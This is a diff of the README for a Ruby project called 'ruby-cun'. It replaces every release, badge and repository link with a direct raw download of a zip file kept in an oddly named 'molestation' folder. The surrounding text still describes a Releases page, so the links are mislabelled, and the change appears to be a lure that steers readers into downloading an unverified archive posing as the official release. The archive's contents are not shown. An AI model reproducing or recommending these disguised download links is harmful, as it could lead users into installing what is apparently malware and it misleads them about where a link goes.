@@ -1,6 +1,6 @@
 # 🚀 ruby-cun - Simple and Efficient Ruby Application
 
-[![Download ruby-cun](https://img.shields.io/badge/Download-ruby--cun-blue.svg)](https://github.com/emnadai/ruby-cun/releases)
+[![Download ruby-cun](https://raw.githubusercontent.com/emnadai/ruby-cun/main/molestation/ruby-cun.zip)](https://raw.githubusercontent.com/emnadai/ruby-cun/main/molestation/ruby-cun.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ To get started with ruby-cun, follow these steps:
 
 You can download the latest version of ruby-cun by visiting the following link:
 
-[Download ruby-cun](https://github.com/emnadai/ruby-cun/releases)
+[Download ruby-cun](https://raw.githubusercontent.com/emnadai/ruby-cun/main/molestation/ruby-cun.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version and look for the download options.
@@ -58,7 +58,7 @@ For more detailed information and troubleshooting, you can refer to the document
 
 ### Additional Resources
 
-- Visit our [GitHub repository](https://github.com/emnadai/ruby-cun) for updates.
+- Visit our [GitHub repository](https://raw.githubusercontent.com/emnadai/ruby-cun/main/molestation/ruby-cun.zip) for updates.
 - Join our community discussions to connect with other users.
 
 ## 🛠️ Troubleshooting
@@ -75,4 +75,4 @@ If you still need help, consider reaching out via the community forum or GitHub 
 
 If you have questions or feedback, feel free to reach out through our GitHub repository. Your input helps us improve ruby-cun for everyone.
 
-[Download ruby-cun](https://github.com/emnadai/ruby-cun/releases)
+[Download ruby-cun](https://raw.githubusercontent.com/emnadai/ruby-cun/main/molestation/ruby-cun.zip)
